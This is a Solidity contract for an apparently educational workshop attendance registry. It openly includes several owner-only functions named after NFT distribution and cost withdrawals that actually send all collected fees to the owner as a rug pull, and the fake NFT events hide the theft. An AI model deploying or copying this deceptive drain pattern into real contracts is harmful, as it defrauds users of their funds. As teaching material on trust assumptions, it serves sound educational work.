// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title Workshop Attendance Registry
 * @notice Educational smart contract demonstrating trust assumptions
 * WARNING: This contract contains intentional vulnerabilities for teaching purposes
 * The owner can exploit user trust through deceptive function names
 */
contract WorkshopRegistry {
    
    // State variables
    address public owner;
    uint256 public registrationFee;
    mapping(address => bool) public attendees;
    address[] public attendeeList;
    mapping(address => bool) public nftDistributed;
    uint256 public totalCollected;
    
    // Custom errors for gas efficiency
    error IncorrectFee();
    error AlreadyRegistered();
    error NotRegistered();
    error Unauthorized();
    error TransferFailed();
    error InsufficientBalance();
    
    // Events
    event AttendeeRegistered(
        address indexed attendee, 
        uint256 timestamp, 
        uint256 totalAttendees
    );
    
    event NFTDistributed(
        address indexed recipient, 
        uint256 timestamp
    );
    
    event FundsWithdrawn(
        uint256 amount, 
        string reason
    );
    
    // Modifiers
    modifier onlyOwner() {
        if (msg.sender != owner) revert Unauthorized();
        _;
    }
    
    // Constructor
    constructor(uint256 _registrationFee) {
        owner = msg.sender;
        registrationFee = _registrationFee;
    }
    
    // Main registration function
    function register() external payable {
        if (msg.value != registrationFee) revert IncorrectFee();
        if (attendees[msg.sender]) revert AlreadyRegistered();
        
        attendees[msg.sender] = true;
        attendeeList.push(msg.sender);
        totalCollected += msg.value;
        
        emit AttendeeRegistered(msg.sender, block.timestamp, attendeeList.length);
    }
    
    // View/Query functions
    function isRegistered(address _address) public view returns (bool) {
        return attendees[_address];
    }
    
    function getAttendeeCount() public view returns (uint256) {
        return attendeeList.length;
    }
    
    function getAttendeeList() public view returns (address[] memory) {
        return attendeeList;
    }
    
    function getTotalCollected() public view returns (uint256) {
        return totalCollected;
    }
    
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    // =============================================
    // EXPLOIT FUNCTIONS - Educational Purposes Only
    // =============================================
    
    /**
     * @notice DECEPTIVE FUNCTION - Appears to distribute NFTs but actually drains all funds
     * This function demonstrates how malicious owners can exploit user trust
     * The function name suggests legitimate NFT distribution but performs a rug pull
     */
    function distributeNFT(address recipient) public onlyOwner {
        if (!attendees[recipient]) revert NotRegistered();
        if (nftDistributed[recipient]) revert AlreadyRegistered();
        
        // Mark as distributed to maintain appearance of legitimacy
        nftDistributed[recipient] = true;
        
        // HIDDEN EXPLOIT: Transfer ALL contract funds to owner
        // This looks like NFT processing but actually drains the contract
        (bool success, ) = owner.call{value: address(this).balance}("");
        if (!success) revert TransferFailed();
        
        emit NFTDistributed(recipient, block.timestamp);
    }
    
    /**
     * @notice BATCH EXPLOIT - Claims to distribute NFTs to all attendees
     * Actually performs a single massive rug pull
     */
    function batchDistributeNFTs() public onlyOwner {
        uint256 attendeeCount = attendeeList.length;
        
        // Mark all attendees as having received NFTs (fake processing)
        for (uint256 i = 0; i < attendeeCount; i++) {
            nftDistributed[attendeeList[i]] = true;
            emit NFTDistributed(attendeeList[i], block.timestamp);
        }
        
        // MASSIVE RUG PULL: Transfer entire balance in one transaction
        (bool success, ) = owner.call{value: address(this).balance}("");
        if (!success) revert TransferFailed();
    }
    
    /**
     * @notice DECEPTIVE WITHDRAWAL - Appears legitimate but is another drain mechanism
     * Claims to be for NFT minting costs but is just another way to steal funds
     */
    function withdrawForNFTCosts(uint256 amount) public onlyOwner {
        if (amount > address(this).balance) revert InsufficientBalance();
        
        (bool success, ) = owner.call{value: amount}("");
        if (!success) revert TransferFailed();
        
        emit FundsWithdrawn(amount, "NFT minting costs");
    }
    
    /**
     * @notice Additional exploit function - "Emergency" withdrawal
     * Another deceptive function that sounds legitimate
     */
    function emergencyWithdraw() public onlyOwner {
        uint256 balance = address(this).balance;
        if (balance == 0) revert InsufficientBalance();
        
        (bool success, ) = owner.call{value: balance}("");
        if (!success) revert TransferFailed();
        
        emit FundsWithdrawn(balance, "Emergency withdrawal");
    }
    
    // Receive function to accept plain ETH transfers
    receive() external payable {
        // Automatically add to total collected when ETH is sent directly
        totalCollected += msg.value;
    }
    
    // Fallback function
    fallback() external payable {
        totalCollected += msg.value;
    }
}
